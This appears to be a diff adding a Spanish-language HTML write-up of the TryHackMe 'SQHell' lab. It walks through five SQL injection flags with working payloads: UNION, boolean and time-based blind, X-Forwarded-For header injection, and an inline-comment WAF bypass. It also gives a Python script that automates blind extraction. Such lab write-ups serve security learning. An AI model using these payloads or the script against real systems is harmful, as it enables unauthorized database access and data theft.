@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="es" data-bs-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>THM - SQHell | cat4clysm</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet" />
+  <link href="../style.css" rel="stylesheet" />
+  <link href="writeup.css" rel="stylesheet" />
+</head>
+<body>
+  <nav class="navbar navbar-dark fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand fw-bold text-danger" href="../index.html">&gt;_ cat4clysm</a>
+      <a href="../index.html#writeups" class="btn btn-sm btn-outline-secondary"><i class="bi bi-arrow-left"></i> Volver</a>
+    </div>
+  </nav>
+
+  <main class="container py-5 mt-5">
+    <div class="writeup-header p-4 rounded mb-4">
+      <div class="d-flex flex-wrap gap-2 mb-3">
+        <span class="badge bg-info text-dark fs-6">TryHackMe</span>
+        <span class="badge bg-warning text-dark fs-6">Medium</span>
+        <span class="badge bg-secondary">Web</span>
+        <span class="badge bg-secondary">SQLi</span>
+        <span class="badge bg-secondary">Blind SQLi</span>
+      </div>
+      <h1 class="text-white fw-bold mb-1">SQHell</h1>
+      <p class="text-secondary mb-3">Cinco retos de SQL injection: in-band, blind booleano, blind time-based y bypass de WAF. Enfocado en técnicas manuales de explotación SQLi.</p>
+      <div class="d-flex flex-wrap gap-3 text-secondary small">
+        <span><i class="bi bi-calendar3"></i> 2023</span>
+        <span><i class="bi bi-clock"></i> ~120 min</span>
+        <span><i class="bi bi-person"></i> cat4clysm</span>
+      </div>
+    </div>
+
+    <div class="mb-4">
+      <h5 class="text-danger border-left-red mb-3"><i class="bi bi-tools"></i> Herramientas utilizadas</h5>
+      <div class="d-flex flex-wrap gap-2">
+        <span class="badge bg-dark border border-secondary p-2">burp suite</span>
+        <span class="badge bg-dark border border-secondary p-2">sqlmap</span>
+        <span class="badge bg-dark border border-secondary p-2">curl</span>
+        <span class="badge bg-dark border border-secondary p-2">python scripting</span>
+      </div>
+    </div>
+
+    <section class="mb-5">
+      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-1-circle"></i> Flag 1 — In-Band SQLi</h4>
+      <p class="text-secondary">Inyección directa en parámetro GET, los resultados se reflejan en la respuesta.</p>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>GET /?id=1 UNION SELECT 1,flag,3 FROM flags-- -</code></pre>
+      </div>
+      <div class="code-block mb-3">
+        <pre><code><span class="text-success">THM{flag1...}</span></code></pre>
+      </div>
+    </section>
+
+    <section class="mb-5">
+      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-2-circle"></i> Flag 2 — Blind Boolean SQLi</h4>
+      <p class="text-secondary">No hay output visible — inferimos datos carácter a carácter por verdadero/falso.</p>
+      <div class="code-block mb-3">
+        <pre><code>GET /?user=admin' AND SUBSTRING((SELECT flag FROM flags LIMIT 1),1,1)='T'--</code></pre>
+      </div>
+      <p class="text-secondary">Script Python para automatizar la extracción:</p>
+      <div class="code-block mb-3">
+        <pre><code>import requests
+flag = ""
+for i in range(1, 50):
+    for c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_":
+        payload = f"admin' AND SUBSTRING((SELECT flag FROM flags),{i},1)='{c}'-- -"
+        r = requests.get(f"http://TARGET/?user={payload}")
+        if "Welcome" in r.text:
+            flag += c
+            break
+print(flag)</code></pre>
+      </div>
+    </section>
+
+    <section class="mb-5">
+      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-3-circle"></i> Flag 3 — Blind Time-Based SQLi</h4>
+      <p class="text-secondary">Sin diferencia en la respuesta — usamos <code>SLEEP()</code> para inferir datos.</p>
+      <div class="code-block mb-3">
+        <pre><code>GET /?id=1' AND IF(SUBSTRING((SELECT flag FROM flags),1,1)='T', SLEEP(3), 0)-- -</code></pre>
+      </div>
+      <p class="text-secondary">Si la respuesta tarda 3 segundos, el carácter es correcto.</p>
+    </section>
+
+    <section class="mb-5">
+      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-4-circle"></i> Flag 4 — Header Injection</h4>
+      <p class="text-secondary">La inyección está en el header <code>X-Forwarded-For</code>:</p>
+      <div class="code-block mb-3">
+        <pre><code>GET / HTTP/1.1
+X-Forwarded-For: 1' UNION SELECT flag,2 FROM flags-- -</code></pre>
+      </div>
+    </section>
+
+    <section class="mb-5">
+      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-5-circle"></i> Flag 5 — WAF Bypass</h4>
+      <p class="text-secondary">El WAF bloquea palabras clave como <code>SELECT</code>, <code>UNION</code>. Bypass con case mixing y comentarios:</p>
+      <div class="code-block mb-3">
+        <pre><code>GET /?id=1 /*!UNION*/ /*!SELECT*/ 1,flag,3 FROM flags-- -</code></pre>
+      </div>
+    </section>
+
+    <section class="mb-5">
+      <h4 class="text-success border-left-green mb-3"><i class="bi bi-lightbulb"></i> Lecciones aprendidas</h4>
+      <ul class="text-secondary">
+        <li>SQLi no siempre está en parámetros GET/POST — headers como <code>X-Forwarded-For</code>, <code>User-Agent</code> o <code>Cookie</code> también pueden ser vulnerables.</li>
+        <li>Las técnicas blind (boolean y time-based) son más lentas pero funcionan cuando no hay output visible.</li>
+        <li>Los WAFs se pueden evadir con comentarios inline <code>/*!*/</code>, case alternado y encoding.</li>
+      </ul>
+    </section>
+  </main>
+
+  <footer class="py-4 text-center border-top border-secondary">
+    <p class="text-secondary mb-0"><span class="text-danger">&gt;_</span> cat4clysm &copy; 2025 &nbsp;·&nbsp;<span class="text-muted">Hack the planet.</span></p>
+  </footer>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
